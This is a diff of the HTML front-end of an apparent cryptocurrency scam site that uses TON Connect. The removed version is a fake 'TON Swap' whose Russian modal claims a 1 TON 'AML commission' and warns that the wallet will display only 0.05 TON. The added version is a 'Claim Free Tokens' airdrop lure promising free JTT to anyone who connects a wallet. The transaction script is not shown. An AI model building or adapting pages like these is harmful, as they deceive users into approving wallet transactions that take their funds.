@@ -3,12 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <title>TON Swap</title>
+    <title>Jettoken Airdrop - Claim Free Tokens</title>
 
-    <link rel="stylesheet" href="style.css?v=5">
+    <link rel="stylesheet" href="style.css?v=10">
     <link rel="tonconnect-manifest" href="tonconnect-manifest.json">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
@@ -16,27 +13,13 @@
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-    <!-- AML Commission Acceptance Modal -->
-    <div id="aml-modal" class="aml-modal">
-        <div class="aml-content">
-            <h2>⚠️ Комиссия за AML проверку</h2>
-            <p>Для обеспечения безопасности и соблюдения правил AML (Anti-Money Laundering), каждая транзакция проходит автоматическую проверку.</p>
-            <div class="highlight">Комиссия: 1 TON</div>
-            <div class="warning">
-                ⓘ В кошельке TonKeeper вы увидите только 0.05 TON. Комиссия 1 TON списывается автоматически одним подтверждением.
-            </div>
-            <p>Нажимая кнопку ниже, вы соглашаетесь с комиссией 1 TON за проведение AML проверки вашей транзакции.</p>
-            <button id="accept-commission" class="accept-btn">Принять и продолжить</button>
-        </div>
-    </div>
-
     <header class="header">
         <div class="logo">
             <svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M14 28C21.732 28 28 21.732 28 14C28 6.26801 21.732 0 14 0C6.26801 0 0 6.26801 0 14C0 21.732 6.26801 28 14 28Z" fill="#0098EA"/>
                 <path d="M19.1419 8.75L13.9959 18.0649L8.84999 8.75H19.1419ZM20.8919 7H7.09999C6.28949 7 5.76211 7.8575 6.13606 8.575L13.0645 21.1172C13.4695 21.85 14.5225 21.85 14.9275 21.1172L21.856 8.575C22.2299 7.8575 21.7025 7 20.8919 7Z" fill="white"/>
             </svg>
-            <span>TON Swap</span>
+            <span>Jettoken Airdrop</span>
         </div>
         <div id="ton-connect"></div>
     </header>
@@ -44,58 +27,42 @@
     <main class="main">
         <div class="swap-card">
             <div class="swap-header">
-                <h2>Swap</h2>
-                <button class="settings-btn">⚙️</button>
+                <h2>Claim Free Tokens</h2>
             </div>
 
-            <div class="input-section">
-                <div class="input-header">
-                    <span>You pay</span>
-                    <span class="balance" id="user-balance">Balance: 0</span>
+            <div class="airdrop-info">
+                <div class="token-icon-large">
+                    <div class="fake-icon large-icon">JTT</div>
                 </div>
-                <div class="input-row">
-                    <input type="number" id="payAmount" value="50" placeholder="0.0">
-                    <div class="token-selector">
-                        <img src="https://ton-connect.github.io/demo-dapp/apple-touch-icon.png" alt="TON">
-                        <span>TON</span>
-                    </div>
-                </div>
-            </div>
-
-            <div class="swap-arrow">
-                <span>↓</span>
-            </div>
-
-            <div class="input-section">
-                <div class="input-header">
-                    <span>You receive</span>
-                </div>
-                <div class="input-row">
-                    <input type="number" id="receiveAmount" value="50" readonly>
-                    <div class="token-selector">
-                        <div class="fake-icon">USDT</div>
-                        <span>USDT</span>
-                    </div>
-                </div>
+                <h3 class="token-title">Jettoken (JTT)</h3>
+                <p class="token-desc">Connect your wallet and claim your free tokens. One claim per wallet.</p>
             </div>
 
             <div class="swap-details">
                 <div class="detail-row">
-                    <span>Exchange rate</span>
-                    <span>1 TON = 1 USDT</span>
+                    <span>You receive</span>
+                    <span class="highlight-amount">100 JTT</span>
                 </div>
                 <div class="detail-row">
-                    <span>Exchange fee</span>
-                    <span>1 TON</span>
+                    <span>Cost</span>
+                    <span>FREE</span>
+                </div>
+                <div class="detail-row">
+                    <span>Limit</span>
+                    <span>1 claim per wallet</span>
+                </div>
+                <div class="detail-row">
+                    <span>Network</span>
+                    <span>TON Mainnet</span>
                 </div>
             </div>
 
-            <button id="swapBtn" class="swap-btn">Connect Wallet</button>
+            <button id="claimBtn" class="swap-btn">Connect Wallet</button>
             <div id="status" class="status-msg"></div>
         </div>
     </main>
 
-    <script src="config.js?v=8"></script>
-    <script src="script.js?v=8"></script>
+    <script src="config.js?v=10"></script>
+    <script src="script.js?v=10"></script>
 </body>
 </html>
